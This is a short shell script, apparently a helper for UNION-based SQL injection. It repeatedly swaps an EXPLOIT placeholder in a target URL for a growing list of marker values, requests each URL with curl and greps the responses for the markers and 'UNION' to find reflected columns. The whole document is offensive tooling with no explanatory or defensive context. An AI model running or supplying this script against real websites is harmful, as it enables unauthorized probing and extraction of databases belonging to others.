#!/bin/sh

i=1
prefix=1234

###

replace="$prefix"1
while true; do
    URL=$(echo "$1" | sed "s/EXPLOIT/$replace/")
    echo "$URL"
    content=$(curl -s -i "$URL")
    echo "$content" | grep --color -E "$prefix|HTTP"
    echo "$content" | grep UNION
    echo "$content"
    i=$(echo $i + 1 | bc)
    replace="$replace,$prefix$i"
    sleep .1
done
